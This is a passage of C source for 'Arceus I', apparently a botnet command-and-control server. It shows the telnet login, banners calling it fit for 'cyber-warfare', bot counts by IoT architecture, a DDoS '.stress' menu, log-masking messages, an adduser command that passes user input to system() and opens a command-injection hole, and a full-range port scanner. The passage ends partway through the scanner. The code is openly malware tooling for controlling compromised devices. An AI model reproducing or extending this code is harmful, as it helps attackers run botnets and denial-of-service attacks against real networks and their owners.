  char Prompt_1 [500]; // Char Every Line For Output Communication
  char Prompt_2 [500]; // Char Every Line For Output Communication
  char Prompt_3 [500]; // Char Every Line For Output Communication
  char Prompt_4 [500]; // Char Every Line For Output Communication
  char Prompt_5 [500]; // Char Every Line For Output Communication  
  char Prompt_6 [500]; // Char Every Line For Output Communication  
  char Prompt_7 [500]; // Char Every Line For Output Communication  
  char Prompt_8 [500]; // Char Every Line For Output Communication  
  char Prompt_9 [500]; // Char Every Line For Output Communication  
  char Prompt_10 [500]; // Char Every Line For Output Communication  

  sprintf(Prompt_1,  "                  \e[38;5;201m╔═════════════════════════════╗\r\n"); // Display Menu - Login Menu
  sprintf(Prompt_2,  "                  \e[38;5;201m║     \e[38;5;202mWelcome To Arceus I     \e[38;5;201m║\r\n"); // Display Menu - Login Menu
  sprintf(Prompt_3,  "                  \e[38;5;201m║ \e[38;5;202mPlease Enter your Username  \e[38;5;201m║\r\n"); // Display Menu - Login Menu
  sprintf(Prompt_4,  "                  \e[38;5;201m║ \e[38;5;202mIn the Login Prompt Below   \e[38;5;201m║\r\n"); // Display Menu - Login Menu
  sprintf(Prompt_5,  "                  \e[38;5;201m╚═════════════════════════════╝     \r\n"); // Display Menu - Login Menu
  sprintf(Prompt_6,  "              \e[38;5;201m╔═════════════════════════════════════╗\r\n"); // Display Menu - Login Menu
  sprintf(Prompt_7,  "              \e[38;5;201m║        \e[38;5;202mThis Source Code is          \e[38;5;201m║\r\n"); // Display Menu - Login Menu
  sprintf(Prompt_8,  "              \e[38;5;201m║     \e[38;5;202m Licensed under GPU V3.0        \e[38;5;201m║\r\n"); // Display Menu - Login Menu
  sprintf(Prompt_9,  "              \e[38;5;201m║  \e[38;5;202mFOR ALLOWED USE IN 'CYBER-WARFARE' \e[38;5;201m║\r\n"); // Display Menu - Login Menu
  sprintf(Prompt_10,  "              \e[38;5;201m╚═════════════════════════════════════╝\r\n"); // Display Menu - Login Menu


  if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if(send(thefd, Prompt_1, strlen(Prompt_1), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if(send(thefd, Prompt_2, strlen(Prompt_2), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if(send(thefd, Prompt_3, strlen(Prompt_3), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if(send(thefd, Prompt_4, strlen(Prompt_4), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if(send(thefd, Prompt_5, strlen(Prompt_5), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if(send(thefd, Prompt_6, strlen(Prompt_6), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if(send(thefd, Prompt_7, strlen(Prompt_7), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if(send(thefd, Prompt_8, strlen(Prompt_8), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if(send(thefd, Prompt_9, strlen(Prompt_9), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if(send(thefd, Prompt_10, strlen(Prompt_10), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast

  sprintf(botnet, "\e[38;5;201mUsername:\e[38;5;202m "); // Username Input
  if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if (fdgets(buf, sizeof buf, thefd) < 1) goto end; // Restate Buffer Size, If Output Is Released
  trim(buf); // Trim [Buffer]
  sprintf(usernamez, buf); // Use Data From 'Usernamez'
  nickstring = ("%s", buf); // Find String Input From User
  find_line = Search_in_File(nickstring); // We Search The User File

    if (strcmp(nickstring, accounts[find_line].user) == 0) { // Here Is Our Login System
    sprintf(botnet, "\e[38;5;202mLogging In As User: \e[38;5;201m%s\r\n", accounts[find_line].user, buf); // Find User, Via The Login File, This Is Dependent On User Input
    sprintf(botnet, "\e[38;5;202mPlease Enter Your Password!\r\n"); // Enter Password Display Output - This Is User Input
    sprintf(botnet, "\e[38;5;201mPassword: \e[38;5;202m"); // Enter Password - This Is User Input
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
    if (fdgets(buf, sizeof buf, thefd) < 1) goto end; // Restate Buffer Size, If Output Is Released
    trim(buf); // Trim [Buffer]
    if (strcmp(buf, accounts[find_line].password) != 0) goto failed; // If No User, Is Found, Continue To 'Failed' Output
    memset(buf, 0, 2048); // Memset Data Block Fill, Just So We Are Stable
    goto Arceus; // Go To 'Arceus'
  }
    failed:
        pthread_create(&title, NULL, &titleWriter, sock);
        char failed_line1[5000]; // Char Every Line For Output Communication
        char failed_line2[5000]; // Char Every Line For Output Communication

        char clearscreen [5000]; // Char Every Line For Output Communication
        memset(clearscreen, 0, 2048); // Memset Data Block Fill, Just So We Are Stable
        sprintf(clearscreen, "\033[2J\033[1;1H"); // Clear Screen

        sprintf(failed_line1, "Login Error!\r\n");  // We are Attempting To Display FailedBanner!
        sprintf(failed_line2, "If you run into this issue please contact the owner!\r\n");  // We are Attempting To Display FailedBanner!


        sleep(1); // You Have Failed!
        if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        sleep(3); // Sleep For 3 Seconds, Clean Exit
        goto end; // You Have Failed!
        if (send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        Arceus: // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        char start_1 [90000]; // Char Every Line For Output Communication
        char start_2 [90000]; // Char Every Line For Output Communication
        char start_3 [90000]; // Char Every Line For Output Communication
        char start_4 [90000]; // Char Every Line For Output Communication
        char start_7 [90000]; // Char Every Line For Output Communication
        char start_8 [90000]; // Char Every Line For Output Communication
        char start_9 [90000]; // Char Every Line For Output Communication
        char start_10 [90000]; // Char Every Line For Output Communication
        char start_12 [90000]; // Char Every Line For Output Communication
        char start_13 [90000]; // Char Every Line For Output Communication
        char Arceus_1 [90000]; // Char Every Line For Output Communication
        char Arceus_2 [90000]; // Char Every Line For Output Communication
        char Arceus_3 [90000]; // Char Every Line For Output Communication
        char Arceus_4 [90000]; // Char Every Line For Output Communication
        char Arceus_5 [90000]; // Char Every Line For Output Communication
        char Arceus_6 [90000]; // Char Every Line For Output Communication
        char Arceus_7 [90000]; // Char Every Line For Output Communication
        char Arceus_8 [90000]; // Char Every Line For Output Communication
        char Arceus_9 [90000]; // Char Every Line For Output Communication
        char Arceus_10 [9000]; // Char Every Line For Output Communication
        char Arceus_11 [9000]; // Char Every Line For Output Communication
        char Arceus_12 [9000]; // Char Every Line For Output Communication
        char Arceus_13 [9000]; // Char Every Line For Output Communication
        char Arceus_14 [9000]; // Char Every Line For Output Communication
        char Arceus_15 [9000]; // Char Every Line For Output Communication
        char Arceus_16 [9000]; // Char Every Line For Output Communication
        char Arceus_17 [9000]; // Char Every Line For Output Communication
        char Arceus_18 [9000]; // Char Every Line For Output Communication
        char Arceus_19 [9000]; // Char Every Line For Output Communication
    
        // clear
        sprintf(start_1,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mRemoving All Traces Of LD_Preload..\r\n"); // Successful Connection, We Are Loading Into Arceus...
        sprintf(start_2,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mFinished Removing ALL Traces Of LD_Preload!\r\n"); // Successful Connection, We Are Loading Into Arceus...
        // clear 
        sprintf(start_3,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mMasking Connection From utmp+wtmp...\r\n"); // Successful Connection, We Are Loading Into Arceus...
        sprintf(start_4,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mSucessfully Masked Connection! \r\n"); // Successful Connection, We Are Loading Into Arceus...
        // clear
        sprintf(start_7,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mLogging User Information..\r\n"); // Successful Connection, We Are Loading Into Arceus...
        sprintf(start_8,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mUser Information Successfully Logged!\r\n"); // Successful Connection, We Are Loading Into Arceus...
        // clear
        sprintf(start_9,  "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mWelcome \e[38;5;93m[\e[38;5;202m%s\e[38;5;93m]\r\n", accounts[find_line].user, buf); // Successful Connection, We Are Loading Into Arceus...
        sprintf(start_10, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mYour Access Level Is \e[38;5;93m%s!\r\n", accounts[find_line].id, buf); // Successful Connection, We Are Loading Into Arceus...
        sprintf(start_12, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mLoading Arceus C2 Session.. \r\n"); // Successful Connection, We Are Loading Into Arceus...
        sprintf(start_13, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[90m| \e[38;5;202mArceus C2 Session Loaded! \r\n"); // Successful Connection, We Are Loading Into Arceus...
        //clear
        sprintf(Arceus_1,    "\e[38;5;201m╔════════════════════════════════════╗\r\n");
        sprintf(Arceus_2,    "\e[38;5;201m║  \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mMain Menu \e[38;5;201m- \e[38;5;202mWelcome!\e[38;5;201m   ║\r\n");
        sprintf(Arceus_3,    "\e[38;5;201m╠════════════════════════════════════╣\r\n");
        sprintf(Arceus_4,    "\e[38;5;201m║   \e[38;5;202m Welcome to Project Arceus I     \e[38;5;201m╠════╗\r\n");
        sprintf(Arceus_5,    "\e[38;5;201m║  \e[38;5;202mThis source is currently in beta  \e[38;5;201m║    ║   ╔════╗\r\n");
        sprintf(Arceus_6,    "\e[38;5;201m╚═══════════════╦════════════════════╝    ╚═══╣ \e[38;5;93m<3 \e[38;5;201m╠══╗\r\n");
        sprintf(Arceus_7,    "\e[38;5;201m                ║ \e[38;5;93mFlexingOnLamers \e[38;5;202mx \e[38;5;93mJack   \e[38;5;201m   ╚════╝  ║\r\n");
        sprintf(Arceus_8,    "\e[38;5;201m                ║ \e[38;5;93mTransmissional \e[38;5;202mx \e[38;5;93mZach    \e[38;5;201m           ║\r\n");
        sprintf(Arceus_9,    "\e[38;5;201m╔═══════════════╩══════════════════╗                  ║\r\n");
        sprintf(Arceus_10,   "\e[38;5;201m║  \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mCommand List \e[38;5;201m- \e[38;5;202mCmDs  \e[38;5;201m║ ╔════════════════╩════════════════════════╗\r\n");
        sprintf(Arceus_11,   "\e[38;5;201m╠══════════════════════════════════╣ ║ \e[38;5;202mOS_Sys\e[38;5;201m: \e[38;5;202mCentOS \e[38;5;201m[\e[38;5;202m6\e[38;5;201m]\e[38;5;202m - \e[38;5;201m[\e[38;5;202m7\e[38;5;201m]                \e[38;5;201m║\r\n");
        sprintf(Arceus_12,   "\e[38;5;201m║ \e[38;5;202m.help \e[38;5;201m- \e[38;5;202mFull List of Commands    \e[38;5;201m║ ║ \e[38;5;202mCCR\e[38;5;201m: \e[38;5;202mXXX-223-389                        \e[38;5;201m║\r\n");
        sprintf(Arceus_13,   "\e[38;5;201m║ \e[38;5;202m.stress \e[38;5;201m- \e[38;5;202mList of DDoS Commands  \e[38;5;201m╠═╣ \e[38;5;202mCIPHER\e[38;5;201m: \e[38;5;202mSHA-512 \e[38;5;201m, \e[38;5;202mAES-BYTE \e[38;5;201m, \e[38;5;202mCIPHER-TLS \e[38;5;201m║\r\n");
        sprintf(Arceus_14,   "\e[38;5;201m║ \e[38;5;202m.logout \e[38;5;201m- \e[38;5;202mLogs out of the C2     \e[38;5;201m║ ║ \e[38;5;202mSTATE\e[38;5;201m: \e[38;5;202mPRIVATE                          \e[38;5;201m║\r\n");
        sprintf(Arceus_15,   "\e[38;5;201m║ \e[38;5;202m.clear \e[38;5;201m- \e[38;5;202mClears screen           \e[38;5;201m║ ║ \e[38;5;202mOBJ-TYPE\e[38;5;201m: \e[38;5;202mC2 SOURCE X TELNET LAYER      \e[38;5;201m║\r\n");
        sprintf(Arceus_16,   "\e[38;5;201m║ \e[38;5;202m.tools \e[38;5;201m- \e[38;5;202mList of available tools \e[38;5;201m║ ║ \e[38;5;202mLSC\e[38;5;201m: \e[38;5;202mGL3.0                              \e[38;5;201m║\r\n");
        sprintf(Arceus_17,   "\e[38;5;201m╚══════════════════════════════════╝ ╚═════════════════════════════════════════╝\r\n");
        sprintf(Arceus_18,   " \r\n");
        sprintf(Arceus_19,   " \r\n");
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, start_1, strlen(start_1), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2); 
        if(send(thefd, start_2, strlen(start_2), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        if(send(thefd, start_3, strlen(start_3), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2); 
        if(send(thefd, start_4, strlen(start_4), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        if(send(thefd, start_7, strlen(start_7), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2); 
        if(send(thefd, start_8, strlen(start_8), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, start_9, strlen(start_9), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2); 
        if(send(thefd, start_10, strlen(start_10), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2); // Clear Screen From Broadcast -- We Are Stable !
        if(send(thefd, start_12, strlen(start_12), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (2);
        if(send(thefd, start_13, strlen(start_13), MSG_NOSIGNAL) == -1) goto end; // Clear Screen From Broadcast -- We Are Stable !
        sleep (5);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Arceus_1, strlen(Arceus_1), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, Arceus_2, strlen(Arceus_2), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, Arceus_3, strlen(Arceus_3), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, Arceus_4, strlen(Arceus_4), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, Arceus_5, strlen(Arceus_5), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, Arceus_6, strlen(Arceus_6), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
        if(send(thefd, Arceus_7, strlen(Arceus_7), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_8, strlen(Arceus_8), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_9, strlen(Arceus_9), MSG_NOSIGNAL) == -1) goto end;   // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_10, strlen(Arceus_10), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_11, strlen(Arceus_11), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_12, strlen(Arceus_12), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_13, strlen(Arceus_13), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_14, strlen(Arceus_14), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_15, strlen(Arceus_15), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_16, strlen(Arceus_16), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_17, strlen(Arceus_17), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_18, strlen(Arceus_18), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        if(send(thefd, Arceus_19, strlen(Arceus_19), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        while(1) 
        { // We are Displaying Attempting to display main banner!
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mArceus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // We are Displaying Attempting to display main banner!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        break; // World Break!
        } // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        managements[thefd].connected = 1; // We are Displaying Attempting to display main banner!

      while(fdgets(buf, sizeof buf, thefd) > 0) // Buffer Size, Stated Less Than 0, This Allows Consistent Connection
      {
      if (strstr(buf, ".bots")) // Output For Command - '.bots'
      {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
      {
      char total[128]; // Char Every Line For Output Communication -- 128 byte
      char mips[128]; // Char Every Line For Output Communication
      char sh4[128]; // Char Every Line For Output Communication
      char arm[128]; // Char Every Line For Output Communication
      char ppc[128]; // Char Every Line For Output Communication
      char x86[128]; // Char Every Line For Output Communication
      char spc[128]; // Char Every Line For Output Communication
      char bot_1 [5000]; // Char Every Line For Output Communication
      char bot_2 [5000]; // Char Every Line For Output Communication
      char bot_3 [5000]; // Char Every Line For Output Communication
      char bot_4 [5000]; // Char Every Line For Output Communication

      sprintf(bot_1,    "\e[38;5;201m╔════════════════════════════════════════════╗\r\n"); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(bot_2,    "\e[38;5;201m║ \e[38;5;202mArceus I \e[38;5;201m- \e[38;5;202mDevice Listing \e[38;5;201m- \e[38;5;202mArch Detection \e[38;5;201m║\r\n"); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(bot_3,    "\e[38;5;201m╠════════════════════════════════════════════╣\r\n");
      sprintf(mips,     "\e[38;5;201m║ \e[38;5;202mMips Devices: \e[38;5;201m%d                            \e[38;5;201m║\r\n", mipsConnected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(arm,      "\e[38;5;201m║ \e[38;5;202mArm Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", armConnected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(sh4,      "\e[38;5;201m║ \e[38;5;202mSh4 Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", sh4Connected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(ppc,      "\e[38;5;201m║ \e[38;5;202mPpc Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", ppcConnected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(x86,      "\e[38;5;201m║ \e[38;5;202mx86 Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", x86Connected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(spc,      "\e[38;5;201m║ \e[38;5;202mSpc Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", spcConnected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(total,    "\e[38;5;201m║ \e[38;5;202mTotal IoT Devices: \e[38;5;201m%d                       \e[38;5;201m║\r\n", clientsConnected()); // Display Menu - Device Count - [ARCH DETECTION BROKEN, THIS IS STILL IN BETA]
      sprintf(bot_4,    "\e[38;5;201m╚════════════════════════════════════════════╝\r\n");
      if (send(thefd, bot_1, strlen(bot_1), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, bot_2, strlen(bot_2), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, bot_3, strlen(bot_3), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, mips, strlen(mips), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, sh4, strlen(sh4), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, arm, strlen(arm), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, ppc, strlen(ppc), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, x86, strlen(x86), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, spc, strlen(spc), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, total, strlen(total), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      if (send(thefd, bot_4, strlen(bot_4), MSG_NOSIGNAL) == -1) goto end; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        else // If The User Is Not Admin, Then Use Else Statement To Carry Out Following Output
      {
        sprintf(botnet, "\e[38;5;201m╔════════════════════════════════════════╗\r\n\e[38;5;201m║ \e[38;5;202mYou Do Not Have the needed Permissions \e[38;5;201m║\r\n\e[38;5;201m║      \e[38;5;202mTo View or use this command!      \e[38;5;201m║\r\n\e[38;5;201m╚═══════════════════════════════╦════════╝\r\n                                \e[38;5;201m║\r\n                                \e[38;5;201m║\r\n         \e[38;5;201m╔══════════════════════╩═══════════════════════════╗\r\n         \e[38;5;201m║   \e[38;5;202m Want An Upgrade? Dm Me or zach on discord!    \e[38;5;201m║\r\n         \e[38;5;201m║  \e[38;5;93mGeorgia Cri#4337 \e[38;5;201m-  \e[38;5;202mOwO  \e[38;5;201m- \e[38;5;93mTransmissional#9845  \e[38;5;201m║\r\n         \e[38;5;201m╚══════════════════════════════════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }  
      if (strstr(buf, "resolve") || strstr(buf, "RESOLVE")) // Resolve Command - Function Requires 'resolve.h'
      {
      char *ip[100]; // Char Every Line For Output Communication
      char *token = strtok(buf, " "); // Char Every Line For Output Communication
      char *url = token+sizeof(token); // Char Every Line For Output Communication
      trim(url); // Trim [Url]
      //resolve(url, ip); // Using User Input - Stated As 'Url' or 'IP' - We Use This In The Resolver Function
          sprintf(botnet, "\e[38;5;202mResolved \e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mto \e[38;5;93m[\e[38;5;202m%s\e[38;5;93m]\r\n", url, ip); // Resolver Output
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
            if(strstr(buf, ".adduser") || strstr(buf, ".ADDUSER") || strstr(buf, "adduser") || strstr(buf, "ADDUSER")) // Add User Function, This Allows Us To Easily Add A New User To The Network, Without Having To Manually Edting The login.txt
    {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
      {
        char *token = strtok(buf, " "); // Char Every Line For Output Communication
        char *userinfo = token+sizeof(token); // Char Every Line For Output Communication
        trim(userinfo); // Trim [Userinfo]
        char *uinfo[50]; // Char Every Line For Output Communication
        sprintf(uinfo, "echo '%s' >> arceus.txt", userinfo); // We Are Editing The Following File --> 'arceus.txt' Which Is Our 'Login.txt'
        system(uinfo); // Access Of System Functions In Order To Edit The File From The Communicating Screen
        printf("\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mAdded User\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\n", accounts[find_line].user, userinfo); // Adding User - Output
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mSuccessfully Added!\r\n", userinfo); // Adding User - Output
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "Admins Only!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
        else if(strstr(buf, "PORTSCAN") || strstr(buf, "portscan")) // Portscan Function - Easy And Stable Port Scan [II]
        {
            int x; // We State X As The Unknown Integer [This Will Be The User Input]
            int ps_timeout = 3; // Create An Integer For The Time-Out, This Will Minimise Network Saturation
            int least_port = 1; // Create An Integer For The First Port - [We Need A Start Point Of Course]
            int max_port = 65535; // Create An Integer For The First Port - [We Need A End Point Of Course]
            char host[16]; // Char Every Line For Output Communication
            trim(buf); // Trim [Buffer]
            char *token = strtok(buf, " "); // Char Every Line For Output Communication
            snprintf(host, sizeof(host), "%s", token+strlen(token)+1); // Check Host, Create '+1' Token, Then Use 'Botnet'
            snprintf(botnet, sizeof(botnet), "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mChecking ports \e[38;5;93m[\e[38;5;202m%d\e[38;5;93m] \e[38;5;202mthrough \e[38;5;93m[\e[38;5;202m%d\e[38;5;93m] \e[38;5;202mFor IP\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\x1b[0m\r\n", least_port, max_port, host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // We Will Terminate Concurrent Function And Carry on.. Use Values As Follows 'x'
            for(x=least_port; x < max_port; x++) // We Start From The Lowest Port To Biggest Port
            {
                int Sock = -1; // Create Integer For Socket - '-1'
                struct timeval timeout; // We Are Creating A Timing System - This Is For Timeout, Creating Struct. For 'timeval-timeout'
                struct sockaddr_in sock; // Struct. Creation Of Sock-Address
                // set timeout secs
                timeout.tv_sec = ps_timeout; // Timeout - tv
                timeout.tv_usec = 0; // Timeout - tv_usec
                Sock = socket(AF_INET, SOCK_STREAM, 0); // Create Our TCP Socket Using AF_INET
                setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)); // Setsockopt -- This Is Our RCV Time -- [Received]
                setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)); // Setsockopt -- This Is Our SND Time -- [Sending]
                sock.sin_family = AF_INET; // Socket-Sin, Family -- Using AF_INET
                sock.sin_port = htons(x); // Using 'htons' Set As The 'x' Value
                sock.sin_addr.s_addr = inet_addr(host); // State The 'inet' As The Host, Suffix Has Been Created, So Process Is Independent
